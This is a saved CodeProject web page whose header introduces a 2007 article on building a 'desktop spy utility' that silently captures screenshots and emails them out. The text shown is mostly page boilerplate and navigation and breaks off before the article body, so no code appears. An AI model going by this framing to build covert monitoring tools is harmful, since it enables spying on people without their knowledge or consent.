<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0054)http://www.codeproject.com/KB/miscctrl/desktopspy.aspx -->
<HTML><HEAD><TITLE>CodeProject: Desktop spy utility that emails subject's screenshots to you. Free source code and programming help</TITLE>
<META http-equiv=Content-Type content="text/html; charset=utf-8">
<META 
content="Make a surveillance application which silently captures desktop and emails you screenshots as attachment periodically; Author: Omar Al Zabir; Section: Miscellaneous; Chapter: Desktop Development" 
name=Description>
<META 
content=".NET 1.1, .NET 2.0, C# 1.0, C# 2.0, .NET 3.0, C# 3.0, .NET 3.5, C#, .NET, Dev, Beginner,Miscellaneous,Desktop Development,Free source code, tutorials" 
name=Keywords>
<META content="The Code Project" name=Author>
<META content=General name=Rating>
<META content="index, follow" name=Robots>
<META content="1 days" name=Revisit-After><LINK 
title="CodeProject Lounge Postings" 
href="http://www.codeproject.com/webservices/LoungeRSS.aspx" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - All topics" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=1" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - MFC / C++" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=2" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - C#" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=3" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - ASP.NET" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=4" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - .NET" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=5" 
type=application/rss+xml rel=alternate><LINK 
title="CodeProject Latest articles - VB.NET" 
href="http://www.codeproject.com/webservices/articlerss.aspx?cat=6" 
type=application/rss+xml rel=alternate><LINK title=CodeProject 
href="http://www.codeproject.com/info/OpenSearch.xml" 
type=application/opensearchdescription+xml rel=search><LINK 
href="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/CodeProject.css" 
type=text/css rel=stylesheet><LINK 
href="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/ForumClassic.css" 
type=text/css rel=stylesheet>
<SCRIPT type=text/javascript>
  var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
  document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</SCRIPT>

<SCRIPT type=text/javascript>
   var pageTracker = _gat._getTracker("UA-1735123-1");
   pageTracker._setDomainName("codeproject.com");
   pageTracker._setSessionTimeout("1200"); // 20 mins
   pageTracker._initData();
   pageTracker._trackPageview();
</SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/oncopy.js" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/addto.js" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript type=text/javascript><!--
function ToggleMenu(itemName)
{
	var elm = document.getElementById(itemName);
	var i,others = document.getElementById('SectionMenu');
	for(i=0; i < others.childNodes.length; i++)
	{
		var other = others.childNodes[i];
		if ((other.className == 'MenuSectionBlock') && (other != elm))
			other.style.display='none';
	}
	if (elm.style.display == 'block') elm.style.display='none';
	else elm.style.display='block';
	return false;
}

--></SCRIPT>

<SCRIPT language=Javascript type=text/javascript><!--
var Selected = "-1";

function SwitchMessage(e, msgId)
{
  if (!msgId) {
    if(!e)e=window.event;
    var target=e.target?e.target:e.srcElement;
    while(target&&target.id!='DynMessLink')target=target.parentNode;
    if(!target||target.id!='DynMessLink')return;
    msgId=target.name;
  }
  if(Selected&&Selected!=""){
    var body=eval("document.getElementById('" + Selected + "_h1')");
    if(body) body.style.display = 'none';
    var head=eval("document.getElementById('" + Selected + "_h0')");
    if(head) head.className = head.className.replace("Sel", "UnSel");
  }
  if(Selected==msgId.toString())
    Selected="";
  else {
    Selected=msgId.toString();
    var body=eval("document.getElementById('" + Selected + "_h1')");
    if(body){
      if(body.style.display=='none') body.style.display='';
      else body.style.display = 'none';
    }
    var head=eval("document.getElementById('" + Selected + "_h0')");
    if (head) 
      head.className = head.className.replace("UnSel", "Sel");
    if(body&&head&&body.style.display!='none'){
      document.body.scrollTop = getRealPos(head, "Top") - document.body.clientHeight/10;
      EnsureMessageVisible(Selected, true);
    }
  }
  if (e){if(e.preventDefault)e.preventDefault;else e.returnValue=false;}
  return false;
}

--></SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/ShortCuts.js" 
type=text/javascript></SCRIPT>
<LINK href="/favicon.ico" type=image/ico rel=icon><LINK href="/favicon.ico" 
type=image/ico rel="shortcut icon">
<SCRIPT type=text/javascript>
	function SetAsAvailable() {
	   var aid = document.getElementById("ArticleId");
	   if(aid)
		   window.location.href = "/script/Articles/UpdateArticleStatus.aspx?aid=" + articleId.value + "&rp=" + location.href;
	}
	</SCRIPT>

<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY>
<TABLE id=ctl00_AT cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR vAlign=top>
    <TD colSpan=2>
      <TABLE cellSpacing=0 cellPadding=0 border=0>
        <TBODY>
        <TR>
          <TD class=HeaderLogo><A href="http://www.codeproject.com/"><IMG 
            height=90 alt=Home src="/Images/Standard/codeproject225x90.gif" 
            width=225 border=0></A></TD>
          <TD class=HeaderBanner align=right width="100%"><IFRAME 
            src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/ServeHTML.htm" 
            frameBorder=0 width=728 scrolling=no height=90></IFRAME></TD></TR>
        <TR>
          <TD colSpan=2>
            <TABLE class=MemberNavBar cellSpacing=0 cellPadding=5 
              width="100%"><TBODY>
              <TR>
                <TD class=SmallText style="FONT-WEIGHT: bold">4,881,172 
                  members and growing! (10,700 online)</TD>
                <TD align=right>
                  <DIV class=MemberNavBarText 
                  id=ctl00_MemberMenu_LoggedOffOptions 
                  style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px"><A 
                  name=SignUp></A>
                  <FORM id=subForm 
                  style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px" 
                  name=subForm 
                  action=/script/Membership/LogOn.aspx?rp=%2fKB%2fmiscctrl%2fdesktopspy.aspx 
                  method=post>Email <INPUT class=SmallText id=Email 
                  style="WIDTH: 100px" name=Email> Password <INPUT 
                  class=SmallText id=Password style="WIDTH: 60px" type=password 
                  name=Password> <INPUT class=FormButton type=submit value="Sign in">
                  <SCRIPT type=text/javascript>
function Join(){document.location.href='/script/Membership/Modify.aspx';return false;}
document.write('<input type="button" class="FormButton" onclick="return Join();" value="Join"');
document.write('<input type="hidden" name="fld_quicksign" value="true" />');
</SCRIPT>
                   <INPUT id=RememberMeCheck type=checkbox CHECKED name=cookie> 
                  <LABEL for=RememberMeCheck>Remember me?</LABEL>&nbsp; <A 
                  id=ctl00_MemberMenu_SendPassword 
                  href="http://www.codeproject.com/script/Membership/SendPassword.aspx?rp=%2fKB%2fmiscctrl%2fdesktopspy.aspx"><IMG 
                  height=16 alt=help src="/script/Membership/Images/help.gif" 
                  width=16 align=absMiddle border=0>Lost your password?</A> 
                  </FORM></DIV></TD></TR></TBODY></TABLE></TD></TR>
        <TR>
          <TD colSpan=2>
            <TABLE class=SiteNavBar id=tblSiteToolbar cellSpacing=0 
            cellPadding=0>
              <TBODY>
              <TR>
                <TD><A href="http://www.codeproject.com/">Home</A></TD>
                <TD class=SelCat noWrap><A 
                  href="http://www.codeproject.com/?cat=1">All Topics</A></TD>
                <TD noWrap><A 
                  href="http://www.codeproject.com/?cat=2">MFC/C++</A></TD>
                <TD noWrap><A 
                href="http://www.codeproject.com/?cat=3">C#</A></TD>
                <TD noWrap><A 
                  href="http://www.codeproject.com/?cat=6">VB.NET</A></TD>
                <TD noWrap><A 
                  href="http://www.codeproject.com/?cat=4">ASP.NET</A></TD>
                <TD noWrap><A 
                href="http://www.codeproject.com/?cat=9">SQL</A></TD>
                <TD noWrap><A 
                  href="http://www.codeproject.com/?cat=8">Architect</A></TD>
                <TD width="100%">&nbsp;</TD>
                <TD id=ctl00_TopNavBar_RightMenus><!--380-->
                  <DIV id=MenuPos 
                  style="WIDTH: 305px; POSITION: relative; TOP: 1px; HEIGHT: 22px">
                  <TABLE 
                  style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; HEIGHT: 20px; BORDER-RIGHT-WIDTH: 0px" 
                  cellSpacing=0 cellPadding=0 width=305>
                    <TBODY>
                    <TR vAlign=center>
                      <TD 
                      style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
                      noWrap><A 
                        href="http://www.codeproject.com/info/FAQ.aspx">Help!</A></TD>
                      <TD 
                      style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
                      noWrap><A 
                        href="http://www.codeproject.com/script/Articles/Latest.aspx">Articles</A></TD>
                      <TD 
                      style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
                      noWrap><A 
                        href="http://www.codeproject.com/script/Forums/List.aspx">Message 
                        Boards</A></TD>
                      <TD 
                      style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
                      noWrap><A 
                        href="http://www.codeproject.com/Lounge.aspx">Lounge</A></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD vAlign=top colSpan=2><A name=_top></A>
      <TABLE class=ArticleUneditedHeader id=ctl00_ArticleTopHeader_HeaderTable 
      cellSpacing=0 cellPadding=3 width="100%" border=0>
        <TBODY>
        <TR vAlign=top>
          <TD class=SmallText><A id=ctl00_ArticleTopHeader_ChapterLink 
            href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=1">Desktop 
            Development</A> » <A id=ctl00_ArticleTopHeader_SectionLink 
            href="http://www.codeproject.com/KB/miscctrl/">Miscellaneous</A> » 
            <A id=ctl00_ArticleTopHeader_SubsectionLink 
            href="http://www.codeproject.com/KB/miscctrl/index.aspx?#Miscellaneous - Windows Forms">Windows 
            Forms</A> <SPAN class=ArticleBeginner 
            id=ctl00_ArticleTopHeader_SkillLevel>&nbsp;&nbsp;&nbsp; 
            Beginner</SPAN> <SPAN class=SmallText 
            id=ctl00_ArticleTopHeader_LicenceTerms 
            style="MARGIN-LEFT: 40px">License: <A 
            href="http://www.codeproject.com/info/cpol10.aspx">The Code Project 
            Open License (CPOL)</A></SPAN> <BR><BR>
            <H1><SPAN class=ArticleTopTitle 
            id=ctl00_ArticleTopHeader_ArticleTitle>Desktop spy utility that 
            emails subject's screenshots to you</SPAN></H1><B>By <A 
            href="http://www.codeproject.com/script/Articles/MemberArticles.aspx?amid=138289">Omar 
            Al Zabir</A></B><BR><BR><SPAN class=ArticleTopDescr 
            id=ctl00_ArticleTopHeader_ArticleDescr>Make a surveillance 
            application which silently captures desktop and emails you 
            screenshots as attachment periodically</SPAN> </TD>
          <TD class=SmallText style="WIDTH: 210px"><SPAN 
            id=ctl00_ArticleTopHeader_ArticleAttributes>C# (C# 1.0, C# 2.0, C# 
            3.0), C#, .NET, .NET (.NET 3.5, .NET 3.0, .NET 1.1, .NET 2.0), 
            WinForms, Dev</SPAN><BR><BR><SPAN 
            style="PADDING-RIGHT: 2ex">Posted</SPAN>: <B>29 Dec 
            2007</B><BR><SPAN style="PADDING-RIGHT: 0.5ex">Updated</SPAN>: <B>29 
            Dec 2007</B> <BR><SPAN style="PADDING-RIGHT: 3.2ex">Views</SPAN>: 
            <B>1,097</B><BR></TD></TR>
        <TR>
          <TD colSpan=2>
            <TABLE width="100%">
              <TBODY>
              <TR>
                <TD>
                  <DIV id=ctl00_ArticleTopHeader_UneditedDiv><B>Note: <A 
                  id=ctl00_ArticleTopHeader_UneditedLnk 
                  href="http://www.codeproject.com/script/Articles/Unedited.aspx">This 
                  is an unedited reader contribution</A></B> </DIV></TD>
                <TD class=SmallText style="WHITE-SPACE: nowrap" 
              align=right></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
  <TR vAlign=top>
    <TD class=LHNavBar id=ctl00_LeftNavCell>
      <DIV style="PADDING-TOP: 5px; TEXT-ALIGN: center"><IFRAME 
      src="C:\Documents and Settings\admin\Desktop\qwe\CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files\ServeHTML(1).htm" 
      frameBorder=0 width=150 scrolling=no height=80></IFRAME></DIV>
      <DIV class=FeatureBlockHeader>Announcements</DIV>
      <DIV class="FeatureBlockContent RHFeatureBar">
      <DIV style="PADDING-TOP: 0px"><IMG 
      style="PADDING-RIGHT: 14px; FLOAT: left; MARGIN-LEFT: 7px; MARGIN-RIGHT: 10px" 
      height=20 alt=Comp src="/script/Awards/Images/prize_winner.gif" width=10> 
      <A id=ctl00_Announcements_CompLink 
      href="http://www.codeproject.com/Feature/ArticleCompetition/">Monthly 
      Competition</A><BR clear=all>
      <DIV style="PADDING-BOTTOM: 5px; PADDING-TOP: 3px"><IMG 
      style="PADDING-RIGHT: 10px; FLOAT: left; MARGIN-LEFT: 7px; MARGIN-RIGHT: 8px" 
      height=16 alt=Staff src="/script/membership/images/staff_sm.gif" width=12> 
      <A href="http://www.codeproject.com/info/jobs/">We're Hiring!</A></DIV>
      <DIV style="PADDING-BOTTOM: 5px; PADDING-TOP: 3px"><IMG 
      style="PADDING-RIGHT: 0px; MARGIN-TOP: 3px; FLOAT: left; MARGIN-LEFT: 0px; MARGIN-RIGHT: 0px" 
      height=20 alt=Silverlight src="/images/silverlight_20.jpg" width=27> <A 
      href="http://www.codeproject.com/script/News/View.aspx?nwid=6024">Add 
      Silverlight to your articles</A></DIV></DIV></DIV>
      <DIV class=MenuCat>Services</DIV>
      <DIV class=MenuChapter><A 
      href="http://www.codeproject.com/Services/coffee.aspx">Code Project 
      Coffee</A></DIV>
      <DIV class=MenuChapter><A 
      href="http://www.codeproject.com/Services/TradePub.aspx">Free 
      Magazines</A></DIV>
      <DIV></DIV><BR>
      <DIV id=SectionMenu>
      <DIV class=MenuCat>Chapters</DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter1');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=1">Desktop 
      Development</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter1>
      <DIV class=MI id=Section1><A 
      href="http://www.codeproject.com/KB/buttons/">Button Controls</A></DIV>
      <DIV class=MI id=Section15><A 
      href="http://www.codeproject.com/KB/clipboard/">Clipboard</A></DIV>
      <DIV class=MI id=Section2><A 
      href="http://www.codeproject.com/KB/combobox/">Combo &amp; List 
      Boxes</A></DIV>
      <DIV class=MI id=Section67><A 
      href="http://www.codeproject.com/KB/dialog/">Dialogs and Windows</A></DIV>
      <DIV class=MI id=Section107><A 
      href="http://www.codeproject.com/KB/gadgets/">Desktop Gadgets</A></DIV>
      <DIV class=MI id=Section16><A 
      href="http://www.codeproject.com/KB/docview/">Document / View</A></DIV>
      <DIV class=MI id=Section4><A 
      href="http://www.codeproject.com/KB/edit/">Edit Controls</A></DIV>
      <DIV class=MI id=Section17><A 
      href="http://www.codeproject.com/KB/files/">Files and Folders</A></DIV>
      <DIV class=MI id=Section3><A 
      href="http://www.codeproject.com/KB/grid/">Grid &amp; Data 
      Controls</A></DIV>
      <DIV class=MI id=Section48><A 
      href="http://www.codeproject.com/KB/system/">Hardware &amp; 
      System</A></DIV>
      <DIV class=MI id=Section5><A 
      href="http://www.codeproject.com/KB/list/">List Controls</A></DIV>
      <DIV class=MI id=Section6><A 
      href="http://www.codeproject.com/KB/menus/">Menus</A></DIV>
      <DIV class=MIS id=Section14><A 
      href="http://www.codeproject.com/KB/miscctrl/">Miscellaneous</A></DIV>
      <DIV class=MI id=Section18><A 
      href="http://www.codeproject.com/KB/printing/">Printing</A></DIV>
      <DIV class=MI id=Section95><A 
      href="http://www.codeproject.com/KB/progress/">Progress Controls</A></DIV>
      <DIV class=MI id=Section11><A 
      href="http://www.codeproject.com/KB/selection/">Selection 
      Controls</A></DIV>
      <DIV class=MI id=Section19><A 
      href="http://www.codeproject.com/KB/shell/">Shell and IE 
      programming</A></DIV>
      <DIV class=MI id=Section68><A 
      href="http://www.codeproject.com/KB/smart/">Smart Client</A></DIV>
      <DIV class=MI id=Section8><A 
      href="http://www.codeproject.com/KB/splitter/">Splitter Windows</A></DIV>
      <DIV class=MI id=Section9><A 
      href="http://www.codeproject.com/KB/static/">Static &amp; Panel 
      Controls</A></DIV>
      <DIV class=MI id=Section10><A 
      href="http://www.codeproject.com/KB/statusbar/">Status Bar</A></DIV>
      <DIV class=MI id=Section7><A 
      href="http://www.codeproject.com/KB/tabs/">Tabs &amp; Property 
      Pages</A></DIV>
      <DIV class=MI id=Section12><A 
      href="http://www.codeproject.com/KB/toolbars/">Toolbars &amp; Docking 
      windows</A></DIV>
      <DIV class=MI id=Section13><A 
      href="http://www.codeproject.com/KB/tree/">Tree Controls</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter2');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=2">Web 
      Development</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter2 style="DISPLAY: none">
      <DIV class=MI id=Section70><A 
      href="http://www.codeproject.com/KB/ajax/">AJAX and Atlas</A></DIV>
      <DIV class=MI id=Section27><A 
      href="http://www.codeproject.com/KB/applications/">Applications &amp; 
      Tools</A></DIV>
      <DIV class=MI id=Section85><A 
      href="http://www.codeproject.com/KB/asp/">ASP</A></DIV>
      <DIV class=MI id=Section89><A 
      href="http://www.codeproject.com/KB/aspnet/">ASP.NET</A></DIV>
      <DIV class=MI id=Section28><A 
      href="http://www.codeproject.com/KB/webforms/">ASP.NET Controls</A></DIV>
      <DIV class=MI id=Section38><A 
      href="http://www.codeproject.com/KB/ATL-Server/">ATL Server</A></DIV>
      <DIV class=MI id=Section29><A 
      href="http://www.codeproject.com/KB/web-cache/">Caching</A></DIV>
      <DIV class=MI id=Section91><A 
      href="http://www.codeproject.com/KB/web-image/">Charts, Graphs and 
      Images</A></DIV>
      <DIV class=MI id=Section25><A 
      href="http://www.codeproject.com/KB/scripting/">Client side 
      scripting</A></DIV>
      <DIV class=MI id=Section30><A 
      href="http://www.codeproject.com/KB/custom-controls/">Custom 
      Controls</A></DIV>
      <DIV class=MI id=Section23><A 
      href="http://www.codeproject.com/KB/HTML/">HTML / CSS</A></DIV>
      <DIV class=MI id=Section22><A 
      href="http://www.codeproject.com/KB/IP/">Internet / Network</A></DIV>
      <DIV class=MI id=Section24><A 
      href="http://www.codeproject.com/KB/ISAPI/">ISAPI</A></DIV>
      <DIV class=MI id=Section33><A 
      href="http://www.codeproject.com/KB/server-management/">Site &amp; Server 
      Management</A></DIV>
      <DIV class=MI id=Section34><A 
      href="http://www.codeproject.com/KB/session/">Session State</A></DIV>
      <DIV class=MI id=Section113><A 
      href="http://www.codeproject.com/KB/silverlight/">Silverlight</A></DIV>
      <DIV class=MI id=Section36><A 
      href="http://www.codeproject.com/KB/trace/">Trace and Logs</A></DIV>
      <DIV class=MI id=Section31><A 
      href="http://www.codeproject.com/KB/user-controls/">User 
Controls</A></DIV>
      <DIV class=MI id=Section37><A 
      href="http://www.codeproject.com/KB/validation/">Validation</A></DIV>
      <DIV class=MI id=Section35><A 
      href="http://www.codeproject.com/KB/viewstate/">View State</A></DIV>
      <DIV class=MI id=Section26><A 
      href="http://www.codeproject.com/KB/WAP/">WAP / WML</A></DIV>
      <DIV class=MI id=Section32><A 
      href="http://www.codeproject.com/KB/web-security/">Web Security</A></DIV>
      <DIV class=MI id=Section20><A 
      href="http://www.codeproject.com/KB/webservices/">Web 
      Services</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter9');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=9">Enterprise 
      Systems</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter9 style="DISPLAY: none">
      <DIV class=MI id=Section98><A 
      href="http://www.codeproject.com/KB/MCMS/">Content Management 
      Server</A></DIV>
      <DIV class=MI id=Section99><A 
      href="http://www.codeproject.com/KB/biztalk/">Microsoft BizTalk 
      Server</A></DIV>
      <DIV class=MI id=Section102><A 
      href="http://www.codeproject.com/KB/exchange/">Microsoft 
Exchange</A></DIV>
      <DIV class=MI id=Section90><A 
      href="http://www.codeproject.com/KB/office/">Office Development</A></DIV>
      <DIV class=MI id=Section101><A 
      href="http://www.codeproject.com/KB/sharepoint/">SharePoint 
      Server</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter3');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=3">Multimedia</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter3 style="DISPLAY: none">
      <DIV class=MI id=Section42><A 
      href="http://www.codeproject.com/KB/audio-video/">Audio and 
Video</A></DIV>
      <DIV class=MI id=Section44><A 
      href="http://www.codeproject.com/KB/directx/">DirectX</A></DIV>
      <DIV class=MI id=Section46><A 
      href="http://www.codeproject.com/KB/GDI/">GDI</A></DIV>
      <DIV class=MI id=Section47><A 
      href="http://www.codeproject.com/KB/GDI-plus/">GDI+</A></DIV>
      <DIV class=MI id=Section43><A 
      href="http://www.codeproject.com/KB/graphics/">General Graphics</A></DIV>
      <DIV class=MI id=Section45><A 
      href="http://www.codeproject.com/KB/openGL/">OpenGL</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter4');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=4">Database</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter4 style="DISPLAY: none">
      <DIV class=MI id=Section66><A 
      href="http://www.codeproject.com/KB/database/">Database</A></DIV>
      <DIV class=MI id=Section100><A 
      href="http://www.codeproject.com/KB/reporting-services/">SQL Reporting 
      Services</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter8');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=8">Platforms, 
      Frameworks &amp; Libraries</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter8 style="DISPLAY: none">
      <DIV class=MI id=Section83><A 
      href="http://www.codeproject.com/KB/atl/">ATL</A></DIV>
      <DIV class=MI id=Section117><A 
      href="http://www.codeproject.com/KB/MFC/">MFC</A></DIV>
      <DIV class=MI id=Section88><A 
      href="http://www.codeproject.com/KB/stl/">STL</A></DIV>
      <DIV class=MI id=Section84><A 
      href="http://www.codeproject.com/KB/wtl/">WTL</A></DIV>
      <DIV class=MI id=Section49><A 
      href="http://www.codeproject.com/KB/COM/">COM / COM+</A></DIV>
      <DIV class=MI id=Section76><A 
      href="http://www.codeproject.com/KB/dotnet/">.NET Framework</A></DIV>
      <DIV class=MI id=Section92><A 
      href="http://www.codeproject.com/KB/winsdk/">Win32/64 SDK &amp; 
      OS</A></DIV>
      <DIV class=MI id=Section108><A 
      href="http://www.codeproject.com/KB/vista/">Vista API</A></DIV>
      <DIV class=MI id=Section110><A 
      href="http://www.codeproject.com/KB/vista-security/">Vista 
      Security</A></DIV>
      <DIV class=MI id=Section82><A 
      href="http://www.codeproject.com/KB/cross-platform/">Cross 
      Platform</A></DIV>
      <DIV class=MI id=Section69><A 
      href="http://www.codeproject.com/KB/game/">Game Development</A></DIV>
      <DIV class=MI id=Section73><A 
      href="http://www.codeproject.com/KB/mobile/">Mobile Development</A></DIV>
      <DIV class=MI id=Section106><A 
      href="http://www.codeproject.com/KB/WC/">Windows CardSpace</A></DIV>
      <DIV class=MI id=Section103><A 
      href="http://www.codeproject.com/KB/WCF/">Windows Communication 
      Foundation</A></DIV>
      <DIV class=MI id=Section104><A 
      href="http://www.codeproject.com/KB/WPF/">Windows Presentation 
      Foundation</A></DIV>
      <DIV class=MI id=Section105><A 
      href="http://www.codeproject.com/KB/WF/">Windows Workflow 
      Foundation</A></DIV>
      <DIV class=MI id=Section119><A 
      href="http://www.codeproject.com/KB/library/">Libraries</A></DIV>
      <DIV class=MI id=Section122><A 
      href="http://www.codeproject.com/KB/powershell/">Windows 
      Powershell</A></DIV>
      <DIV class=MI id=Section123><A 
      href="http://www.codeproject.com/KB/linq/">LINQ</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter5');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=5">Languages</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter5 style="DISPLAY: none">
      <DIV class=MI id=Section71><A href="http://www.codeproject.com/KB/cpp/">C 
      / C++ Language</A></DIV>
      <DIV class=MI id=Section72><A 
      href="http://www.codeproject.com/KB/mcpp/">C++ / CLI</A></DIV>
      <DIV class=MI id=Section93><A 
      href="http://www.codeproject.com/KB/cs/">C#</A></DIV>
      <DIV class=MI id=Section78><A 
      href="http://www.codeproject.com/KB/msil/">MSIL</A></DIV>
      <DIV class=MI id=Section86><A 
      href="http://www.codeproject.com/KB/vbscript/">VBScript</A></DIV>
      <DIV class=MI id=Section87><A 
      href="http://www.codeproject.com/KB/vb/">VB.NET</A></DIV>
      <DIV class=MI id=Section115><A 
      href="http://www.codeproject.com/KB/vb-interop/">VB6 Interop</A></DIV>
      <DIV class=MI id=Section77><A 
      href="http://www.codeproject.com/KB/net-languages/">Other .NET 
      Languages</A></DIV>
      <DIV class=MI id=Section21><A 
      href="http://www.codeproject.com/KB/XML/">XML</A></DIV>
      <DIV class=MI id=Section96><A 
      href="http://www.codeproject.com/KB/java/">Java</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter6');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=6">General 
      Programming</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter6 style="DISPLAY: none">
      <DIV class=MI id=Section57><A 
      href="http://www.codeproject.com/KB/recipes/">Algorithms &amp; 
      Recipes</A></DIV>
      <DIV class=MI id=Section64><A 
      href="http://www.codeproject.com/KB/bugs/">Bugs &amp; 
Workarounds</A></DIV>
      <DIV class=MI id=Section79><A 
      href="http://www.codeproject.com/KB/collections/">Collections</A></DIV>
      <DIV class=MI id=Section56><A 
      href="http://www.codeproject.com/KB/security/">Cryptography &amp; 
      Security</A></DIV>
      <DIV class=MI id=Section50><A 
      href="http://www.codeproject.com/KB/datetime/">Date and Time</A></DIV>
      <DIV class=MI id=Section52><A 
      href="http://www.codeproject.com/KB/DLL/">DLLs &amp; Assemblies</A></DIV>
      <DIV class=MI id=Section80><A 
      href="http://www.codeproject.com/KB/exception/">Exception 
      Handling</A></DIV>
      <DIV class=MI id=Section81><A 
      href="http://www.codeproject.com/KB/locale/">Localisation</A></DIV>
      <DIV class=MI id=Section53><A 
      href="http://www.codeproject.com/KB/macros/">Macros and Add-ins</A></DIV>
      <DIV class=MI id=Section54><A 
      href="http://www.codeproject.com/KB/tips/">Programming Tips</A></DIV>
      <DIV class=MI id=Section55><A 
      href="http://www.codeproject.com/KB/string/">String handling</A></DIV>
      <DIV class=MI id=Section58><A 
      href="http://www.codeproject.com/KB/threads/">Threads, Processes &amp; 
      IPC</A></DIV>
      <DIV class=MI id=Section59><A 
      href="http://www.codeproject.com/KB/winhelp/">WinHelp / 
      HTMLHelp</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter10');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=10">Graphics 
      / Design</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter10 style="DISPLAY: none">
      <DIV class=MI id=Section40><A 
      href="http://www.codeproject.com/KB/expression/">Expression</A></DIV>
      <DIV class=MI id=Section114><A 
      href="http://www.codeproject.com/KB/usability/">Usability</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter11');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=11">Development 
      Lifecycle</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter11 style="DISPLAY: none">
      <DIV class=MI id=Section51><A 
      href="http://www.codeproject.com/KB/debug/">Debug Tips</A></DIV>
      <DIV class=MI id=Section39><A 
      href="http://www.codeproject.com/KB/architecture/">Design and 
      Architecture</A></DIV>
      <DIV class=MI id=Section112><A 
      href="http://www.codeproject.com/KB/install/">Installation</A></DIV>
      <DIV class=MI id=Section41><A 
      href="http://www.codeproject.com/KB/work/">Work Issues</A></DIV></DIV>
      <DIV class=MenuChapter><A onclick="return ToggleMenu('Chapter7');" 
      href="http://www.codeproject.com/script/Content/Chapter.aspx?chptId=7">General 
      Reading</A></DIV>
      <DIV class=MenuSectionBlock id=Chapter7 style="DISPLAY: none">
      <DIV class=MI id=Section60><A 
      href="http://www.codeproject.com/KB/books/">Book Chapters</A></DIV>
      <DIV class=MI id=Section61><A 
      href="http://www.codeproject.com/KB/book-reviews/">Book Reviews</A></DIV>
